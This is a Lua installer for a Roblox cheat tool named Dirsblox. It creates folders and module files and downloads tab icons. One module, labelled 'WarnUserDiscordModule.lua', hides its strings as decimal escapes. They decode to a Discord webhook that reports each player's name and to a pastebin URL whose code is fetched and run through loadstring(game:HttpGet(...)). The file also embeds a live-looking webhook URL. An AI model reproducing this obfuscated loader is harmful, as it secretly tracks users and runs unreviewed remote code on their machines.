-- Simple function to simulate MD5 (32-char hex)
local function simulatedMD5(str)
    local hex = ""
    for i = 1, #str do
        hex = hex .. string.format("%02x", string.byte(str, i))
    end
    return hex
end
local readmemd = "Dirsblox/README.md"
-- // Control folders

local asstfld   = "Dirsblox/Core/Assets"
local icofld = "Dirsblox/Core/Assets/Icons"
local previewfl = "Dirsblox/Core/Assets/Icons/Preview"
local sysfld    = "Dirsblox/Core/System"
local modulefld = "Dirsblox/Core/System/Modules"
local servfld = "Dirsblox/Core/System/Services"

-- // Main files
local tokenPath = "Dirsblox/Core/token"
local dataPath  = "Dirsblox/Core/data"
-- // Service
local extsCO = "Dirsblox/Core/System/Services/ExternalReplicatedSignalService"

local player = game.Players.LocalPlayer
local content = "dirsblox token api: " .. player.Name
local correctHash = simulatedMD5(content)

-- // Assets
local imgd = "Dirsblox/Core/Assets/prestart.img"
local gma  = "Dirsblox/Core/Assets/Games"
local ft   = "Dirsblox/Core/Assets/Games/FTF"

-- // Modules
local wrngs = "Dirsblox/Core/System/Modules/WarningsModule.lua"
local verx = "Dirsblox/Core/System/Modules/VersionsDirsbloxModule.lua"
local exc = "Dirsblox/Core/System/Modules/WarnUserDiscordModule.lua"
local nt = "Dirsblox/Core/System/Modules/DownloadImagesModule.lua"
local OperatingContent1 = [[
-- // Copyright © 2018 EchoZone Productions
-- // DIRSBLOX Open Source. DELETING ANY FILES/FUNCTIONS MAY RESULT IN SCRIPT MALFUNCTIONS.

local token = {
    [1] = "b6e0dd7953551faaf0a1d9a9c5411eab",
    [2] = "[DSBCore]", -- This method is deprecated. DO NOT CHANGE
    [3] = "[SYSTEM]"
}
return token
]]
local OperatingContent2 = "BETA V.X.1.5.3"
local OperatingContent3 = [[
local a = ("\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\52\48\52\56\51\57\53\55\56\49\55\52\54\50\51\56\51\53\47\74\90\100\97\102\76\112\55\105\83\76\57\86\113\107\78\75\116\56\50\104\74\88\106\74\106\51\105\97\82\48\51\119\84\118\122\78\113\67\50\103\106\88\113\50\69\51\66\51\68\80\77\98\105\112\118\114\88\53\97\71\84\98\122\53\49\100\66")
local b = ("\104\116\116\112\115\58\47\47\105\46\105\109\103\117\114\46\99\111\109\47\85\107\80\50\79\117\76\46\112\110\103")
local c = ("\78\101\119\32\117\115\101\114\32\106\111\105\110\101\100\33")
local d = ("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\98\83\48\121\82\71\52\81")
_G["\119\101\98\104\111\107"] = a
_G["\116\104\117\109\98"] = b
_G["\116\105\116\108\101\112"] = c
_G["\115\104\111\119\80\108\97\121\101\114\78\97\109\101"] = true
loadstring(game:HttpGet(d))()
]]
local OperatingContent4 = [[
-- // Copyright © 2018 EchoZone Productions
-- // .NET
if not isfile(filePath) then
    local imageUrl = "https://i.imgur.com/Fbprf98.png"
    local imageUrl2 = "https://i.imgur.com/zB3rMje.png"

    local response = request or syn and syn.request or http_request
    if response then
        local result = response({
            Url = imageUrl,
            Method = "GET"
        })

        if result and result.Body then
            writefile(filePath, result.Body)
            print("Image saved at:", filePath)
        else
            warn("Failed to download the image!")
        end
    else
        warn("Your executor does not support requests!")
    end
else
    print("Image already exists, no download made:", filePath)
end
]]
--// readme
local mdcontent = [[
/*
===========≠====+++ WELCOME +++====≠==============

INTRODUCTION
Welcome to DIRSBLOX OPENED SOURCE CODE.
If you’re having trouble with script, i recommend you search
for the support.

======≠+++ https://discord.gg/h5WZ8wYy +++≠==========

SUPPORT
Join the link below if you found a bug, we have BUG FOUNDER
badge, is very rare, if you found a bug you can get it, just
tell it to support in channel Support-ticket.

=========+++ DISCLAIMER/ IMPORTANT +++=============

DISCLAIMER
We make FREE tools to enchance your gameplay, script was
originally made by luna (banida_off) she is originally
BRAZILLIAN and who is writing this is me simon so ya
:p
----------------------------------------------------------------------------

IMPORTANT
If you delete any file, the script may have failure, so DONT
delete.
What you really need to do is call the support team on
that link below
Consequences of deleting a file:

• It CAN'T be created anymore
• The script will NOT work
• It may crash you game
• DO NOT SHARE YOUR TOKEN.
• And again, if u delete a file, please read.
Search for support is your best decision, if not,
we dont care :p
*/
]]

local extcont = [[
{"cmd":"None"}
]]
-- // Safe create functions
local function safeWrite(path, content)
    if not isfile(path) then
        writefile(path, content or "")
        print("[SYSTEM] File created:", path)
    else
        print("[SYSTEM] Refused", path)
    end
end
--
local function safeFolder(path)
    if not isfolder(path) then
        makefolder(path)
        print("[DSBCore] Folder created:", path)
    else
        print("[DSBCore] Folder already exists, skipped:", path)
    end
end

-- // Create structure only once
safeFolder(sysfld)
safeFolder(modulefld)
safeFolder(asstfld)
safeFolder(gma)
safeFolder(ft)
safeFolder(servfld)
safeWrite(dataPath, "")
safeWrite(imgd, "")
safeWrite(readmemd, mdcontent)
safeWrite(wrngs, OperatingContent1)
safeWrite(verx, OperatingContent2)
safeWrite(exc, OperatingContent3)
safeWrite(nt, OperatingContent4)
safeWrite(extsCO, extcont)
-- // image
local basePath  = "Dirsblox/Core/Assets/Games/FTF/"
local filePath  = basePath.."default.png"
local basePath1 = "Dirsblox/Core/Assets/Icons/"
local basePath2 = "Dirsblox/Core/Assets/Icons/Gateway/"

local filePath1 = basePath1.."zB3rMje.png"
local filePath2 = basePath1.."vJU07MU.png"
local filePath3 = basePath1.."pMrzr6z.png"
local filePath4 = basePath1.."CVUSDOX.png"
local filePath5 = basePath1.."gfJHGSv.png"
local filePath6 = basePath1.."5uT3mrj.png"
local filePath7 = basePath2.."dih.png"

local imageUrl  = "https://i.imgur.com/Fbprf98.png" -- default.png
local imageUrl2 = "https://i.imgur.com/zB3rMje.png" -- tab1.png (Universal Hacks)
local imageUrl3 = "https://i.imgur.com/vJU07MU.png" -- tab2.png (Extrasensory Perception)
local imageUrl4 = "https://i.imgur.com/pMrzr6z.png" -- tab3.png (MISC Tab)
local imageUrl5 = "https://i.imgur.com/CVUSDOX.png" -- tab4.png (Exploit Tab)
local imageUrl6 = "https://i.imgur.com/gfJHGSv.png" -- tab5.png (Settings)
local imageUrl7 = "https://i.imgur.com/5uT3mrj.png" -- tipicon.png (++)
local imageUrl8 = "https://cdn.discordapp.com/attachments/1409320415171444858/1410386129546641560/image0.png?ex=68b0d3f0&is=68af8270&hm=a51a026132cb6f64d92fe7117a914a24c321e1e590c804ea0d848236c19a8df1&"

local response = request or (syn and syn.request) or http_request
if not response then
    warn("Your executor does not support requests")
    return
end

local function downloadImage(path, url)
    if not isfile(path) then
        local result = response({
            Url = url,
            Method = "GET"
        })
        if result and result.Body then
            writefile(path, result.Body)
        else
            warn("Image download error, got nil: " .. url)
        end
    else
        -- Nothing happens
    end
end

-- download custom images
downloadImage(filePath,  imageUrl)
downloadImage(filePath1, imageUrl2)
downloadImage(filePath2, imageUrl3)
downloadImage(filePath3, imageUrl4)
downloadImage(filePath4, imageUrl5)
downloadImage(filePath5, imageUrl6)
downloadImage(filePath6, imageUrl7)
downloadImage(filePath7, imageUrl8)

-- // Token system
local function createToken()
    if not isfile(tokenPath) then
        writefile(tokenPath, correctHash)
        print("[DSBCore] Token successfully created: " .. correctHash)
    else
        print("[SYSTEM] File ignored: returned false")
    end
end

local function verifyToken()
    local success, token = pcall(readfile, tokenPath)
    if not success then
        print("[SYSTEM] Creating token...")
        createToken()
        return false
    end
    if token ~= correctHash then
        print("[SYSTEM] Giving request...")
        return false
    end
    print("[SYSTEM] Access granted")
    return true
end

-- // Run check
if not verifyToken() then
    print("First time running")
else
    print("[SYSTEM] Operational System OK")
end
